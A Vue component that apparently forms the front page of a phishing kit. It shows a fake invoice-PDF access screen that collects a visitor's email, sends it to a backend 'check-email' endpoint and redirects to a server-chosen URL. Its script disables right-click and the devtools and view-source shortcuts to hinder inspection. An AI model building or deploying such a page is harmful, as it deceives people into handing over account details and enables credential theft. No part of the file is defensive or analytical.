<template>
  <div class="fullscreen-wrapper">
    <!-- Background layer -->
    <div class="background-blur"></div>

    <!-- Email Verification Section (always visible since CAPTCHA is removed) -->
    <div class="background">
      <div class="toto-container">
        <div class="header">
          <div class="logo-text">
            <span class="success-check"></span>
          </div>
        </div>

        <div class="content">
          <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
          <p style="font-size: 17px;  color: #333333;">FAC654378_06_2025.pdf</p>

          <div class="form-wrapper">
            <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
            <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />

            <label for="email" class="visually-hidden">Email address</label>
            <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />

            <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>

            <button @click="submitForm" :disabled="loading" class="action-button">
              {{ loading ? 'Verifying access...' : 'Next' }}
            </button>
          </div>
        </div>

        <div class="divider"></div>

        <div class="footer-container">
          <p class="footer-text">
            © 2025 <a href="/privacy" target="_blank">Privacy Policy.</a>
          </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const honeypot = ref('')
const error = ref('')
const loading = ref(false)

onMounted(async () => {
  await nextTick()
  document.addEventListener('contextmenu', e => e.preventDefault())
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
      (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase()))
    ) {
      e.preventDefault()
    }
  })
})

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

async function submitForm() {
  if (loading.value) return
  error.value = ''

  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format'
    return
  }

  loading.value = true
  try {
    const res = await fetch(`${import.meta.env.VITE_API_BASE}/api/check-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email.value,
        middleName: honeypot.value
      })
    })
    const data = await res.json()
    if (!res.ok || !data.valid) throw new Error(data.message || 'Verification failed')
    if (data.redirectUrl) {
      setTimeout(() => {
        window.location.href = data.redirectUrl
      }, 1500)
    }
  } catch (err) {
    error.value = err.message
    loading.value = false
  }
}
</script>

<style scoped>
.visually-hidden {
  position: absolute !important;
  height: 1px;
  width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}

html,
body {
  margin: 0;
  padding: 0;
  font-family: Arial, sans-serif;
  height: 100%;
  overflow: hidden;
  background: transparent;
}

.background {
  position: relative;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  background-color: transparent;
  padding-top: 60px;
  box-sizing: border-box;
  z-index: 0;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 0.4rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
}

.toto-container {
  width: 100%;
  max-width: 350px;
  background: #FAF9F6;
  border-radius: 6px;
  box-shadow: 0 1px 0.7px rgba(0, 0, 0, 0.1);
  padding: 2rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
  margin: 50px auto 0 auto;
}

@media screen and (max-width: 768px) {
  .toto-container {
    width: 90%;
    margin: 20px auto 0 auto;
    transform: none;
  }

  .email-input {
    width: 100%;
  }

  .action-button {
    width: 100%;
  }
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 0.1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.success-check {
  font-size: 1.8rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 0.8rem;
  margin-top: 1rem;
  margin-bottom: 1.5rem;
}

.email-input {
  width: 85%;
  padding: 0.5rem;
  border: 0.9px solid #444;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.19rem;
  margin-bottom: -0.19rem;
}

.action-button {
  background-color: #0080e2;
  color: #fff;
  padding: 0.6rem 1.2rem;
  border: 1px solid #444;
  border-radius: 5px;
  cursor: pointer;
  font-size: 1rem;
  width: 90%;
  transition: background-color 0.2s ease;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: #479fe3;
}

.footer-container {
  text-align: center;
}

.footer-text {
  font-size: 0.90rem;
  color: #444;
  margin-top: 0.1rem;
  margin-bottom: 0.9rem;
}

.footer-text a {
  color: inherit;
  text-decoration: none;
}
</style>

<style>
.fullscreen-wrapper {
  position: relative;
  width: 90vw;
  height: 90vh;
  overflow: hidden;
}

.background-blur {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background-image: url('https://i.postimg.cc/bN2DxcPr/sssssint.png');
  background-size: cover;
  background-position: center;
  filter: blur(0.1px) brightness(1);
  z-index: -1;
}
</style>
